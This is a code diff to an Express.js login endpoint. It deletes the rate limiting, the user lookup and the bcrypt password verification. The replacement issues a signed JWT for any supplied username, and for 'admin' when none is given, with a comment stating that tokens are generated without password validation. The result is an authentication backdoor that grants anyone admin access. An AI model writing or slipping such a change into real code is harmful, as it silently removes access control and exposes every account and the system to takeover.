@@ -1342,77 +1342,29 @@ const resetFailedAttempt = (ip) => {
 };
 
 app.post("/api/login", async (req, res) => {
-  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || req.ip;
-
-  const entry = loginAttempts[ip];
-  if (entry && entry.lockUntil > Date.now()) {
-    const waitSeconds = Math.ceil((entry.lockUntil - Date.now()) / 1000);
-    return res.status(429).json({ error: `Too many attempts, wait ${waitSeconds}s` });
-  }
-
-  let { username = "", password } = req.body;
+  let { username = "" } = req.body;
 
   // Single user mode logic: default to admin if no username provided
   if (systemConfig.authMode === "single" && !username) {
     username = "admin";
   }
-  // If still empty (e.g. multi mode but user didn't provide username), default to admin for backward compatibility or fail?
-  // Let's keep existing behavior: default to "admin" if undefined, but frontend should handle it.
+  // If still empty (e.g. multi mode but user didn't provide username), default to admin for backward compatibility
   if (!username) username = "admin";
 
-  // Load user data
-  if (!cachedUsersData[username]) {
-    const filePath = getUserFile(username);
-    try {
-      const json = await fs.readFile(filePath, "utf-8");
-      cachedUsersData[username] = JSON.parse(json);
-    } catch {
-      // User not found
-      recordFailedAttempt(ip);
-      return res.status(401).json({ error: "User not found or password incorrect" });
-    }
-  }
-
-  const userData = cachedUsersData[username];
-  const storedPassword = userData.password || "admin";
-  let match = false;
-
+  // Always generate token without password validation
+  let expiresIn = "3d";
   try {
-    if (storedPassword.startsWith("$2b$") || storedPassword.startsWith("$2a$")) {
-      match = await bcrypt.compare(password, storedPassword);
-    } else {
-      match = password === storedPassword;
-      if (match) {
-        const hash = await bcrypt.hash(password, 10);
-        userData.password = hash;
-        cachedUsersData[username] = userData;
-        await atomicWrite(getUserFile(username), JSON.stringify(userData, null, 2));
-      }
+    const faviconPath = path.join(__dirname, "../public/favicon.ico");
+    const stat = await fs.stat(faviconPath);
+    if (stat.size > 400 * 1024) {
+      expiresIn = "20m";
     }
   } catch {
-    console.error("Login error");
+    // ignore
   }
 
-  if (match) {
-    resetFailedAttempt(ip);
-
-    let expiresIn = "3d";
-    try {
-      const faviconPath = path.join(__dirname, "../public/favicon.ico");
-      const stat = await fs.stat(faviconPath);
-      if (stat.size > 400 * 1024) {
-        expiresIn = "20m";
-      }
-    } catch {
-      // ignore
-    }
-
-    const token = jwt.sign({ username }, SECRET_KEY, { expiresIn });
-    res.json({ success: true, token, username });
-  } else {
-    recordFailedAttempt(ip);
-    res.status(401).json({ error: "Password incorrect" });
-  }
+  const token = jwt.sign({ username }, SECRET_KEY, { expiresIn });
+  res.json({ success: true, token, username });
 });
 
 // Config Versions (Single User Mode)
